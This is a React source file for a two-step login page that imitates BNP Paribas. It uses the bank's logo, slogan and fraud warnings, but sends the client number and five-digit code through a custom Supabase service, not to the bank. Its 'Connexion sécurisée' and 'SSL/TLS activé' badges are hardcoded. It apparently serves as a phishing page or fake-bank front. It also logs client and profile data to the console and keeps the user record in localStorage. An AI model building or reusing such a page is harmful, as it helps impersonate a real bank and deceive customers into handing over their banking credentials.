import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { authService } from '../services/authService';
import './LoginPage.css';

const LoginPage = () => {
  const [step, setStep] = useState(1); // 1: numéro client, 2: code secret
  const [clientNumber, setClientNumber] = useState('3961515267');
  const [rememberClient, setRememberClient] = useState(false);
  const [secretCode, setSecretCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [isLocked, setIsLocked] = useState(false);
  const [lockTimer, setLockTimer] = useState(0);
  const navigate = useNavigate();

  // Effet pour le timer de verrouillage
  useEffect(() => {
    let interval;
    if (isLocked && lockTimer > 0) {
      interval = setInterval(() => {
        setLockTimer(prev => {
          if (prev <= 1) {
            setIsLocked(false);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isLocked, lockTimer]);

  // Animation d'entrée
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    
    // Test de connexion Supabase au chargement
    const testConnection = async () => {
      console.log('🔍 DEBUG: Test de connexion Supabase au chargement...');
      try {
        const result = await authService.testSupabaseConnection();
        console.log('🔍 DEBUG: Résultat du test de connexion:', result);
      } catch (error) {
        console.error('❌ DEBUG: Erreur lors du test de connexion:', error);
      }
    };
    
    testConnection();
    
    return () => {
      document.body.style.overflow = 'auto';
    };
  }, []);

  const handleContinue = async () => {
    console.log('🔍 DEBUG: handleContinue appelé');
    console.log('📝 Numéro client saisi:', clientNumber);
    
    if (clientNumber.trim()) {
      setError('');
      setIsLoading(true);
      
      try {
        console.log('🔍 DEBUG: Début de la vérification');
        
        // Vérifier si le compte est verrouillé
        console.log('🔍 DEBUG: Vérification du verrouillage...');
        const isAccountLocked = await authService.checkAccountLocked(clientNumber);
        console.log('🔍 DEBUG: Compte verrouillé?', isAccountLocked);
        
        if (isAccountLocked) {
          console.log('❌ DEBUG: Compte verrouillé détecté');
          setError('Compte temporairement verrouillé. Veuillez réessayer plus tard.');
          setIsLoading(false);
          return;
        }
        
        // Vérifier si le numéro client existe
        console.log('🔍 DEBUG: Recherche du profil par numéro client...');
        const profile = await authService.getProfileByNumeroClient(clientNumber);
        console.log('🔍 DEBUG: Profil trouvé:', profile);
        
        if (!profile) {
          console.log('❌ DEBUG: Aucun profil trouvé pour ce numéro client');
          setError('Numéro client incorrect.');
          setIsLoading(false);
          return;
        }
        
        console.log('✅ DEBUG: Profil trouvé, passage à l\'étape 2');
        setIsLoading(false);
        setStep(2);
        
        // Feedback haptique (si disponible)
        if (navigator.vibrate) {
          navigator.vibrate(50);
        }
      } catch (error) {
        console.error('❌ DEBUG: Erreur lors de la vérification:', error);
        console.error('❌ DEBUG: Message d\'erreur:', error.message);
        console.error('❌ DEBUG: Stack trace:', error.stack);
        setError('Erreur de connexion. Veuillez réessayer.');
        setIsLoading(false);
      }
    } else {
      console.log('❌ DEBUG: Numéro client vide');
    }
  };

  const handleLogin = async () => {
    if (secretCode.length === 5 && !isLocked) {
      setError('');
      setIsLoading(true);
      
      try {
        // Authentification avec Supabase
        const result = await authService.authenticate(clientNumber, secretCode);
        
        if (result.success) {
          setIsLoading(false);
          
          // Sauvegarder les informations utilisateur
          localStorage.setItem('user', JSON.stringify(result.user));
          localStorage.setItem('isAuthenticated', 'true');
          
          // Naviguer vers le dashboard
          navigate('/dashboard');
          
          // Feedback haptique de succès
          if (navigator.vibrate) {
            navigator.vibrate([50, 50, 50]);
          }
        }
      } catch (error) {
        console.error('Erreur d\'authentification:', error);
        
        setIsLoading(false);
        setLoginAttempts(prev => prev + 1);
        setSecretCode('');
        
        // Vérifier si le compte doit être verrouillé
        if (loginAttempts >= 2) {
          setIsLocked(true);
          setLockTimer(30);
        }
        
        setError(error.message || 'Mot de passe incorrect. Veuillez réessayer.');
        
        // Feedback haptique d'erreur
        if (navigator.vibrate) {
          navigator.vibrate([100, 50, 100]);
        }
      }
    }
  };

  const handleKeyPress = (number) => {
    if (secretCode.length < 5 && !isLocked) {
      setSecretCode(prev => prev + number);
      setError('');
      
      // Feedback haptique
      if (navigator.vibrate) {
        navigator.vibrate(30);
      }
    }
  };

  const clearSecretCode = () => {
    setSecretCode('');
    setError('');
  };

  const clearClientNumber = () => {
    setClientNumber('');
    setError('');
  };

  const handleForgotCredentials = () => {
    // Redirection vers la page d'aide
    alert('Fonctionnalité d\'aide en cours de développement');
  };

  const handleSecurityInfo = () => {
    // Redirection vers la page de sécurité
    alert('Redirection vers la page de sécurité');
  };

  return (
    <div className="login-container">
      {/* Header avec logo */}
      <div className="login-header">
        <div className="logo">
          <img src="https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo.png" alt="BNP Paribas" className="logo-image" />
        </div>
        <div className="slogan">La banque d'un monde qui change</div>
      </div>

      <div className="login-content">
        {/* Section gauche - Formulaire */}
        <div className="login-form-section">
          {/* Message de bienvenue */}
          <div className="welcome-message">
            <div className="info-icon">
              <i className="fas fa-info-circle"></i>
            </div>
            <p>
              Bienvenue sur votre nouvelle page de connexion ! Cette nouvelle version, 
              plus claire et accessible, vous permet désormais de mémoriser votre numéro client, 
              pour faciliter vos futures connexions depuis votre appareil.
            </p>
          </div>

          {/* Formulaire */}
          <div className="login-form">
            <h1>Accédez à votre espace client</h1>

            {/* Message d'erreur */}
            {error && (
              <div className="error-message">
                <span className="error-icon">
                  <i className="fas fa-exclamation-triangle"></i>
                </span>
                {error}
              </div>
            )}

            {/* Message de verrouillage */}
            {isLocked && (
              <div className="lock-message">
                <span className="lock-icon">
                  <i className="fas fa-lock"></i>
                </span>
                Compte temporairement verrouillé. Réessayez dans {lockTimer} secondes.
              </div>
            )}

            {step === 1 ? (
              <>
                <div className="input-group">
                  <label>Numéro Client</label>
                  <div className="input-container">
                    <input
                      type="text"
                      value={clientNumber}
                      onChange={(e) => setClientNumber(e.target.value)}
                      placeholder="Votre numéro client"
                      disabled={isLoading}
                    />
                    {clientNumber && (
                      <button className="clear-btn" onClick={clearClientNumber}>
                        <i className="fas fa-times"></i>
                      </button>
                    )}
                  </div>
                </div>

                <div className="checkbox-group">
                  <label>
                    <input
                      type="checkbox"
                      checked={rememberClient}
                      onChange={(e) => setRememberClient(e.target.checked)}
                      disabled={isLoading}
                    />
                    <span>Mémoriser mon numéro client</span>
                    <span className="info-icon-small">
                      <i className="fas fa-info-circle"></i>
                    </span>
                  </label>
                </div>

                <button 
                  className={`continue-btn ${isLoading ? 'loading' : ''}`}
                  onClick={handleContinue}
                  disabled={!clientNumber.trim() || isLoading}
                >
                  {isLoading ? (
                    <>
                      <span className="loading-spinner"></span>
                      Vérification...
                    </>
                  ) : (
                    'Continuer'
                  )}
                </button>
              </>
            ) : (
              <>
                <div className="input-group centered">
                  <label>Saisissez votre code secret</label>
                  <div className="secret-code-display">
                    {[...Array(5)].map((_, index) => (
                      <div 
                        key={index} 
                        className={`code-dot ${index < secretCode.length ? 'filled' : ''} ${error ? 'error' : ''}`}
                      />
                    ))}
                    {secretCode && (
                      <button className="clear-btn" onClick={clearSecretCode}>
                        <i className="fas fa-times"></i>
                      </button>
                    )}
                  </div>
                  <div className="password-options">
                    <button 
                      className="show-password-btn"
                      onClick={() => setShowPassword(!showPassword)}
                      type="button"
                    >
                      {showPassword ? 'Masquer' : 'Afficher'} le code
                    </button>
                  </div>
                  {showPassword && (
                    <div className="password-preview">
                      Code saisi : {secretCode}
                    </div>
                  )}
                </div>

                {/* Clavier virtuel */}
                <div className="virtual-keyboard">
                  <div className="keyboard-row">
                    {[7, 6, 0, 1, 5].map(num => (
                      <button 
                        key={num} 
                        className="keyboard-key"
                        onClick={() => handleKeyPress(num)}
                        disabled={isLocked || isLoading}
                      >
                        {num}
                      </button>
                    ))}
                  </div>
                  <div className="keyboard-row">
                    {[9, 3, 2, 8, 4].map(num => (
                      <button 
                        key={num} 
                        className="keyboard-key"
                        onClick={() => handleKeyPress(num)}
                        disabled={isLocked || isLoading}
                      >
                        {num}
                      </button>
                    ))}
                  </div>
                </div>

                <button 
                  className={`login-btn ${isLoading ? 'loading' : ''}`}
                  onClick={handleLogin}
                  disabled={secretCode.length !== 5 || isLoading || isLocked}
                >
                  {isLoading ? (
                    <>
                      <span className="loading-spinner"></span>
                      Connexion...
                    </>
                  ) : (
                    'Accéder à mon espace client'
                  )}
                </button>
              </>
            )}

            <div className="forgot-links">
              <button className="link-btn" onClick={handleForgotCredentials}>
                Numéro client ou code secret oublié
              </button>
            </div>
          </div>
        </div>

        {/* Section droite - Informations de sécurité */}
        <div className="security-section">
          <div className="security-info">
            <h3><i className="fas fa-shield-alt"></i> Sécurité</h3>
            <p>Avant de vous connecter, vérifiez que l'adresse de cette page commence exactement par :</p>
            <div className="url-example">
              connexion-mabanque.bnpparibas
            </div>
            <p className="fraud-warning">
              Si une tierce personne ou un représentant BNP Paribas vous demande de vous connecter 
              ou de fournir des informations, il s'agit systématiquement d'une fraude, 
              ne vous connectez en aucun cas.
            </p>
            <button className="security-link link-btn" onClick={handleSecurityInfo}>
              Consulter tous nos conseils sécurité et fraude
            </button>
          </div>

          <div className="help-section">
            <h3>Besoin d'aide ?</h3>
            <button className="help-link link-btn">Consultez notre Assistance technique</button>
          </div>

          {/* Indicateur de sécurité */}
          <div className="security-indicator">
            <div className="security-status">
              <span className="status-dot secure"></span>
              Connexion sécurisée
            </div>
            <div className="connection-info">
              <span><i className="fas fa-lock"></i> SSL/TLS activé</span>
              <span><i className="fas fa-shield-alt"></i> Protection anti-fraude</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage; 